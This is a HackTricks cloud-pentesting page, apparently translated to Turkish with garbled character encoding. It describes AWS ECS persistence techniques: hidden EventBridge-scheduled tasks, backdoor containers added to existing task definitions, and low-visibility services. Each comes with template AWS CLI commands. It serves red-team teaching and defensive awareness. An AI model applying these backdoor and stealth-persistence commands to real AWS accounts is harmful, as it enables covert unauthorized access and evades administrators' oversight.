# AWS - ECS KalÄ±cÄ±lÄ±ÄŸÄ±

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

## ECS

Daha fazla bilgi iÃ§in kontrol edin:

{% content-ref url="../aws-services/aws-ecs-enum.md" %}
[aws-ecs-enum.md](../aws-services/aws-ecs-enum.md)
{% endcontent-ref %}

### Gizli Periyodik ECS GÃ¶revi

{% hint style="info" %}
YAPILACAK: Test
{% endhint %}

Bir saldÄ±rgan, **Amazon EventBridge kullanarak kÃ¶tÃ¼ niyetli bir gÃ¶revin periyodik olarak yÃ¼rÃ¼tÃ¼lmesini zamanlamak** iÃ§in gizli bir periyodik ECS gÃ¶revi oluÅŸturabilir. Bu gÃ¶rev, keÅŸif yapabilir, veri sÄ±zdÄ±rabilir veya AWS hesabÄ±nda kalÄ±cÄ±lÄ±ÄŸÄ± sÃ¼rdÃ¼rebilir.
```bash
# Create a malicious task definition
aws ecs register-task-definition --family "malicious-task" --container-definitions '[
{
"name": "malicious-container",
"image": "malicious-image:latest",
"memory": 256,
"cpu": 10,
"essential": true
}
]'

# Create an Amazon EventBridge rule to trigger the task periodically
aws events put-rule --name "malicious-ecs-task-rule" --schedule-expression "rate(1 day)"

# Add a target to the rule to run the malicious ECS task
aws events put-targets --rule "malicious-ecs-task-rule" --targets '[
{
"Id": "malicious-ecs-task-target",
"Arn": "arn:aws:ecs:region:account-id:cluster/your-cluster",
"RoleArn": "arn:aws:iam::account-id:role/your-eventbridge-role",
"EcsParameters": {
"TaskDefinitionArn": "arn:aws:ecs:region:account-id:task-definition/malicious-task",
"TaskCount": 1
}
}
]'
```
### Varolan ECS GÃ¶rev TanÄ±mÄ±nda Arka KapÄ± Konteyneri

{% hint style="info" %}
YAPILACAK: Test
{% endhint %}

Bir saldÄ±rgan, mevcut bir ECS gÃ¶rev tanÄ±mÄ±na **gizli bir arka kapÄ± konteyneri** ekleyebilir ve bu konteyner yasal konteynerlerle birlikte Ã§alÄ±ÅŸabilir. Arka kapÄ± konteyneri, kalÄ±cÄ±lÄ±k saÄŸlamak ve kÃ¶tÃ¼ amaÃ§lÄ± faaliyetler gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilir.
```bash
# Update the existing task definition to include the backdoor container
aws ecs register-task-definition --family "existing-task" --container-definitions '[
{
"name": "legitimate-container",
"image": "legitimate-image:latest",
"memory": 256,
"cpu": 10,
"essential": true
},
{
"name": "backdoor-container",
"image": "malicious-image:latest",
"memory": 256,
"cpu": 10,
"essential": false
}
]'
```
### BelgeleÅŸtirilmemiÅŸ ECS Hizmeti

{% hint style="info" %}
YAPILACAK: Test
{% endhint %}

Bir saldÄ±rgan, kÃ¶tÃ¼ amaÃ§lÄ± bir gÃ¶rev Ã§alÄ±ÅŸtÄ±ran **belgeleÅŸtirilmemiÅŸ ECS hizmeti** oluÅŸturabilir. Ä°stenen gÃ¶rev sayÄ±sÄ±nÄ± minimuma ayarlayarak ve gÃ¼nlÃ¼ÄŸÃ¼ devre dÄ±ÅŸÄ± bÄ±rakarak, kÃ¶tÃ¼ niyetli hizmetin fark edilmesini yÃ¶neticiler iÃ§in daha zor hale getirilir.
```bash
# Create a malicious task definition
aws ecs register-task-definition --family "malicious-task" --container-definitions '[
{
"name": "malicious-container",
"image": "malicious-image:latest",
"memory": 256,
"cpu": 10,
"essential": true
}
]'

# Create an undocumented ECS service with the malicious task definition
aws ecs create-service --service-name "undocumented-service" --task-definition "malicious-task" --desired-count 1 --cluster "your-cluster"
```
{% hint style="success" %}
Ã–ÄŸren ve AWS Hacking pratiÄŸi yap:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ã–ÄŸren ve GCP Hacking pratiÄŸi yap: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekle</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol et!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±l veya [**telegram grubuna**](https://t.me/peass) katÄ±l veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip et.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸmak iÃ§in PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulun.

</details>
{% endhint %}
